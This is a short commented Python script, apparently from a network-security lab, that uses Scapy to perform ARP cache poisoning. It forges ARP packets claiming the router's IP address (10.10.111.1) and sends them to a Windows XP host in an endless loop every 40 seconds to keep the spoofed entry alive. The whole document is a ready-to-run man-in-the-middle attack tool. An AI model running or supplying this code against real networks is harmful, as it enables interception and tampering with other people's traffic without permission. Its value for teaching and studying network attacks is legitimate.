from scapy.all import *; 	# imports all the packages
from time import sleep;  	# imports sleep function
conf.iface='eth0'
# sets network interface as eth0 which is the first ethernet interface
xp="10.10.111.109"		# IP address of XP machine
rtr="10.10.111.1"	# IP address of RTR, both given to respective variables
packet=ARP()			
# Packet created using ARP and source and destination defined
packet.psrc= rtr
packet.pdst= xp
i=1			# execute loop infinitely till forcefully stopped
while i==1:
	send(packet, verbose=0)
	sleep(40)
# As ARP tables keep on updating after a fixed interval of time. 
# Shooting this request after every 40s helps in maintaining spoofed status.
